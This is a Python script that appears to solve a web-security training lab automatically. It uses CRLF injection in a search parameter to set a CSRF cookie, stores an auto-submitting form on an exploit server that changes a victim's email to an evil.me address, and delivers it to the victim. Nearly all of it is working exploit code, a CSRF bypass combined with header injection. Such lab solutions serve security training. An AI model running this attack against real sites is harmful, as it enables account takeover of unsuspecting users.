#!/usr/bin/env python3

from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def store_exploit(client, exploit_server, host):
    token = 'sometoken'
    cookieURL = f'{host}/?search=x%0d%0aSet-Cookie:+csrf={token}'
    data = {'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': '''HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8''',
            'responseBody': '''<form action="''' + host + '''/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="email&#64;evil&#46;me" />
      <input type="hidden" name="csrf" value="''' + token + '''" />
      <input type="submit" value="Submit request" />
</form>
<img src=''' + cookieURL + ''' onerror="document.forms[0].submit()">''',
            'formAction': 'STORE'}

    return client.post(exploit_server, data=data).status_code == 200

def main():
    print('[+] Running Lab')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print('Usage: {sys.argv[0]} <url>')
        print('URL: {sys.argv[0]} LAB-URL')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    exploit_server = find_exploitserver(client.get(host).text)
    if exploit_server is None:
        print('[-] Failed to find exploit server')
        sys.exit(-2)
    print('[+] Posting to exploit server')

    if not store_exploit(client, exploit_server, host):
        print('[-] Failed to store exploit file')
        sys.exit(-3)
    print('[+] Stored exploit file')

    if client.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False).status_code != 302:
        print(f'[-] Failed to deliver exploit to victim')
        sys.exit(-4)
    print('[+] Delivered exploit to victim')

    if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
        print('[-] Failed to solve lab')
        sys.exit(-9)

    print('[+] Lab solved')


if __name__ == "__main__":
    main()